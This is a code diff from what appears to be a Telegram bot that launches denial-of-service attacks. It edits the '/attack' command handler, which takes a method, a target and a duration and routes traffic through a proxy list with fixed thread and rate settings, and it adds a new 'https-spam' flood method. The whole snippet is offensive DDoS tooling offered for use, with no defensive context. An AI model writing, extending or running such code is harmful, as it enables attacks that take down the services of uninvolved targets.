@@ -80,13 +80,12 @@ bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
     return
   }
 
-  const method = ['flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'flood'
+  const method = ['flood', 'kill', 'bypass', 'https-spam'].includes(params[0]) ? params[0] : 'flood'
   const target = params.length === 3 ? params[1] : params[0]
   const time = parseInt(params.length === 3 ? params[2] : params[1])
   const rate = 24
   const threads = 12
   const proxyfile = './prx.txt'
-
   if (!target || isNaN(time)) {
     bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
     return
